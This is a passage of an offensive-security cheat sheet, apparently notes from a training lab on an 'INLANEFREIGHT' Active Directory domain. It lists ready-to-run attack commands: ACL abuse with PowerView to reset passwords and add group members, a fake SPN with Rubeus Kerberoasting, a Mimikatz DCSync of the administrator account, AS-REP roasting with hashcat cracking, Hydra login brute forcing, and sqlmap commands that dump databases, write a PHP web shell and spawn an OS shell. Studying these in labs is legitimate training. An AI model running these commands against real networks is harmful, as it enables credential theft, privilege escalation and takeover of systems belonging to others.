foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
#Further Enumeration of Rights Using damundsen
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
Get-DomainObjectACL -Identity "GPO Management GroupMembers" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
# Investigating the Help Desk Level 1 Group with Get-DomainGroup
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
# Investigating the Information Technology Group
$itgroupsid = Convert-NameToSid "Information Technology"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
# Looking for Interesting Access
$adunnsid = Convert-NameToSid adunn 
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

# Used to create a PSCredential Object from a Windows-based host.
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Creating a SecureString Object
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# PowerView tool used to change the password of a specifc user (damundsen) on a target Windows domain from a Windows-based host.
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

# PowerView tool used to add a specifc user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host.
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# PowerView tool used to view the members of a specific security group (Help Desk Level 1) and output only the username of each member (Select MemberName) of the group from a Windows-based host.
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# PowerView tool used create a fake Service Principal Name given a sepecift user (adunn) from a Windows-based host.
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
# Kerberoasting with Rubeus 
.\Rubeus.exe kerberoast /user:adunn /nowrap

# remove and clean up 
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

##### DCSync Attack
```
# PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.
Get-DomainUser -Identity adunn | sel
ect samaccountname,objectsid,memberof,useraccountcontrol |fl

# Uses Mimikatz to perform a dcsync attack from a Windows-based host.
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator


# Uses the PowerShell cmd-let Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred

```
##### Miscellanous Configurations
```
# SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host.
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# PowerView tool used to display the description field of select objects (Select-Object) on a target Windows domain from a Windows-based host.
Get-DomainUser * | Select-Object samaccountname,description

# PowerView tool used to check for the PASSWD_NOTREQD setting of select objects (Select-Object) on a target Windows domain from a Windows-based host.
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
##### ASREPRoasting
```
# PowerView based tool used to search for the DONT_REQ_PREAUTH value across in user accounts in a target Windows domain. Performed from a Windows-based host.
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Uses Rubeus to perform an ASEP Roasting attack and formats the output for Hashcat. Performed from a Windows-based host.
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# Uses Hashcat to attempt to crack the captured hash using a wordlist (rockyou.txt). Performed from a Linux-based host.
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt

# Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

##### Trust Relationships Child Parent Trusts
```
# PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
Get-ADTrust -Filter *

# PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
Get-DomainTrust

# PowerView tool used to perform a domain trust mapping from a Windows-based host.
Get-DomainTrustMapping
```

##### Trust Relationships - Cross-Forest
```
# PowerView tool used to enumerate accounts for associated SPNs from a Windows-based host.
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

# PowerView tool used to enumerate the mssqlsvc account from a Windows-based host.
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof

# PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

# PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

## Login Brute Forcing

##### Hydra
```
# Basic Auth Brute Force - User/Pass Wordlists
hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /

# Login Form Brute Force - Static User, Pass Wordlist
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

## SQLMap
```
# Run SQLMap without asking for user input
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

# SQLMap with POST request specifying an unjection point with asterisk
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'

# Passing an HTTP request file to SQLMap
sqlmap -r req.txt

# Specifying a PUT request
sqlmap -u www.target.com --data='id=1' --method PUT

# Specifying a prefix or suffix
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

# Basic DB enumeration
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

# Table enumeration
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

# Table row enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

# Conditional enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

# CSRF token bypass
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

# List all tamper scripts
sqlmap --list-tampers

# Writing a file
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

# Spawn a shell
sqlmap -u "http://www.example.com/?id=1" --os-shell
```
## Useful Resources

[HackTriks](https://book.hacktricks.xyz/)

[WADCOMS](https://wadcoms.github.io/#+SMB+Windows)

[GTFOBins](https://gtfobins.github.io/)

[SwissKeyRepo - Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

[Living Of The Land Binaries and Scripts for Windows](https://lolbas-project.github.io/#)

[Active Directory MindMap](https://orange-cyberdefense.github.io/ocd-mindmaps/)

[Precompiled .NET Binaries](https://github.com/jakobfriedl/precompiled-binaries)
